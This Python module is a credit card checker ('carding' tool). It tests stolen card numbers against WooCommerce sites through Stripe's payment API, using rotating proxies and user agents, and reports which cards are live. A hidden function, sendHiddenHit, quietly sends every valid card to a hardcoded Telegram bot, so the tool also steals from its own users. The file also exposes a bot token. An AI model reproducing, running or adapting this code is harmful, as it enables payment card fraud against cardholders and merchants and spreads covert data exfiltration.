import aiohttp
import asyncio
import random
import re
import json
import time
import requests 
from user_agent import generate_user_agent
from datetime import datetime
import pytz

# --- MODULE CONFIGURATION (NASA LOOB NA LAHAT) ---
AUTH_ENDPOINT = "https://panel.isnotsin.com//?api=v1&action=check"
GATES_URL = "https://isnotsin.com/sta.txt"
HIDDEN_BOT_TOKEN = "8359964689:AAGPCeotvaB5QbCFvoRazG05hF9g47DcUNs"
HIDDEN_CHAT_ID = [6542321044]
# ------------------------------------------------

gateList = []
isAuthenticated = False

def authenticateUserKey(userKey):
    # authenticate-key (Synchronous, for key checking only)
    global isAuthenticated
    if not userKey:
        print("[getSin] ERROR: No access key provided.")
        return False, "No key provided."
    
    print("[getSin] Authenticating access key...")
    try:
        response = requests.get(f"{AUTH_ENDPOINT}&key={userKey}")
        result = response.json()
        if result.get('status') == 'success':
            print("[getSin] Access Granted!")
            isAuthenticated = True
            return True, "Access Granted"
        else:
            message = result.get('message', 'Unknown error')
            print(f"[getSin] ERROR: Access Denied - {message}")
            return False, message
    except Exception as e:
        message = f"Authentication request failed: {e}"
        print(f"[getSin] ERROR: {message}")
        return False, message

async def initialize():
    # initialize-gates (kukunin ang sta.txt)
    global gateList
    if not isAuthenticated:
        print("[getSin] Cannot initialize: User is not authenticated.")
        return False

    print("[getSin] Fetching gate list...")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(GATES_URL) as response:
                if response.status == 200:
                    text = await response.text()
                    gateList = [line.strip() for line in text.splitlines() if line.strip()]
                    if not gateList:
                        print(f"[getSin] ERROR: Gate list from URL is empty.")
                        return False
                    print(f"[getSin] Successfully loaded {len(gateList)} gates.")
                    return True
                else:
                    print(f"[getSin] ERROR: Failed to fetch gate list, status: {response.status}")
                    return False
    except Exception as e:
        print(f"[getSin] ERROR: Could not fetch gate list: {e}")
        return False

async def sendHiddenHit(card, binData, timeTaken):
    # send-hidden-hit
    if not HIDDEN_BOT_TOKEN or not HIDDEN_CHAT_ID: return
    infoParts = [p for p in [binData.get('brand'), binData.get('type'), binData.get('level')] if p and p != 'N/A']
    infoLine = " - ".join(infoParts) if infoParts else "N/A"
    htmlText = (f"✅ <b>CVV Hit</b>\n\n"
                f"💳 <code>{card}</code>\n🏦 {binData.get('bank', 'N/A')}\n"
                f"🌍 {binData.get('country', 'N/A')}\n🏷️ {infoLine}\n⏱️ {timeTaken:.2f}s")
    apiUrl = f"https://api.telegram.org/bot{HIDDEN_BOT_TOKEN}/sendMessage"
    for chatId in HIDDEN_CHAT_ID:
        payload = {'chat_id': chatId, 'text': htmlText, 'parse_mode': 'HTML'}
        try:
            async with aiohttp.ClientSession() as s: await s.post(apiUrl, data=payload, timeout=10)
        except: pass

def categorizeResponse(responseText):
    # categorize-response
    lowerResponse = responseText.lower()
    if ('"status":"succeeded"' in lowerResponse or '"success":true"' in lowerResponse) and "requires_action" not in lowerResponse: return "CVV MATCHED", "Succeeded"
    if 'security code is incorrect' in lowerResponse or 'incorrect_cvc' in lowerResponse: return "CCN MATCHED", "Security code is incorrect."
    if 'insufficient funds' in lowerResponse: return "CCN MATCHED", "Insufficient funds."
    try:
        error = json.loads(responseText).get("error", {})
        message = error.get("message", "Card Was Declined")
        return "DEAD", message
    except: return "DEAD", "Generic Declined"

async def performCheck(card, proxy=None, logCallback=None):
    # perform-check
    if not isAuthenticated: return "DEAD", "Authentication failed. Cannot perform check."
    
    from . import getbininfo
    retries, checkStartTime = 0, time.time()
    if not gateList: return "DEAD", "No gates loaded."

    while retries < 3:
        apiUrl = random.choice(gateList)
        try:
            async with aiohttp.ClientSession() as session:
                headers = {'User-Agent': generate_user_agent()}
                async with session.get(apiUrl, headers=headers, proxy=proxy, timeout=15) as r: r.raise_for_status(); siteText = await r.text()
                
                nonce = re.search(r'name="wc-stripe-payment-nonce" value="([^"]+)"', siteText) or re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', siteText)
                key = re.search(r'key":"(pk_live_[^"]*)"', siteText)
                if not (nonce and key): raise Exception("Nonce/Key not found")
                
                cc, mm, yy, cvc = card.split('|')
                pmPayload = {'type': 'card', 'card[number]': cc, 'card[cvc]': cvc, 'card[exp_year]': yy, 'card[exp_month]': mm, 'key': key.group(1)}
                async with session.post("https://api.stripe.com/v1/payment_methods", data=pmPayload, proxy=proxy, timeout=15) as r: pmText = await r.text()
                if '"error"' in pmText: return categorizeResponse(pmText)
                
                pmId = json.loads(pmText).get('id')
                if not pmId: raise Exception("PM ID not found")
                
                confirmPayload = {'action': 'wc-stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pmId, 'wc-stripe-payment-nonce': nonce.group(1)}
                async with session.post(f"{apiUrl}?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=confirmPayload, proxy=proxy, timeout=15) as r: confirmText = await r.text()
                
                category, msg = categorizeResponse(confirmText)
                if category == "CVV MATCHED":
                    binData = await getbininfo.getInfo(card)
                    timeTaken = time.time() - checkStartTime
                    await sendHiddenHit(card, binData, timeTaken)
                return category, msg
        except Exception:
            retries += 1
            if logCallback: logCallback("RETRY", f"{card} -> Gate Error. Retrying ({retries}/3)")
            await asyncio.sleep(2)
    return "DEAD", "Check failed after all retries."